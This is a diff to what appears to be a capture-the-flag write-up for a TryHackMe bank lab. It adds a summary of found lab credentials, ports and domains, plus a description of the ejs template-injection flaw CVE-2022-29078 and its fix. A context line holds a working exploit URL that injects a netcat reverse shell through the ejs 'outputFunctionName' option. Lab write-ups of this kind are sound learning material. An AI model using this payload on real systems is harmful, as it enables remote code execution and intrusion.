@@ -224,6 +224,27 @@ Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
 
 ![image](https://github.com/user-attachments/assets/f02a71cc-199a-4406-80b6-75b81c2d1476)
 
+<br>
+<h2 align="left">
+  $$\textcolor{#e691c9}{\textbf{Credential 1 = Olivia Cortez:olivi8}}$$ <br>
+  $$\textcolor{#e691c9}{\textbf{Open Ports = 22 and 80}}$$ <br>
+  $$\textcolor{#e691c9}{\textbf{Domains = cyprusbank.thm  and  admin.cyprusbank.thm}}$$<br>
+  $$\textcolor{#e691c9}{\textbf{Credential 2 = Gayle Bev:p~]P@5!6;rs558:q}}$$<br>
+  $$\textcolor{#e691c9}{\textbf{CVE-2022-29078 = Remote Code Execution (RCE) affecting ejs package, versions <3.1.7}}$$<br>
+</h2>
+
+<p><strong>CVE-2022-29078</strong>: The ejs (aka Embedded JavaScript templates) package 3.1.6 for Node.js allows server-side template injection in settings[view options][outputFunctionName]. This is parsed as an internal option, and overwrites the outputFunctionName option with an arbitrary OS command (which is executed upon template compilation).
+Base Score: <code>9.8 critical</code></p>
+
+![image](https://github.com/user-attachments/assets/5e31c636-1db8-4cea-a6e4-8dea68494eff)
+
+<p> How to fix CVE-2022-29078?<br>
+Upgrading <code>ejs</code> to version 3.1.7 or higher</p>
+
+![image](https://github.com/user-attachments/assets/80db4751-d997-45b1-8141-c13e34170787)
+
+
+
 ![image](https://github.com/user-attachments/assets/fdfa2dcd-2e62-403b-bce0-3b173efd8938)
 
 ![image](https://github.com/user-attachments/assets/825b9398-1812-486a-8206-175200e32203)
@@ -234,15 +255,6 @@ Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
 
 ![image](https://github.com/user-attachments/assets/77fbdbba-1f0f-4d22-8429-904a4ed6a5c8)
 
-
-<br>
-<h2 align="left">
-  $$\textcolor{#e691c9}{\textbf{Credential 1 = Olivia Cortez:olivi8}}$$ <br>
-  $$\textcolor{#e691c9}{\textbf{Open Ports = 22 and 80}}$$ <br>
-  $$\textcolor{#e691c9}{\textbf{Domains = cyprusbank.thm  and  admin.cyprusbank.thm}}$$<br>
-  $$\textcolor{#e691c9}{\textbf{Credential 2 = Gayle Bev:p~]P@5!6;rs558:q}}$$<br>
-  $$\textcolor{#e691c9}{\textbf{CVE = }}$$<br>
-</h2>
 
 http://localhost:3000/page?id=2&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('nc -e sh 127.0.0.1 1337');s
 
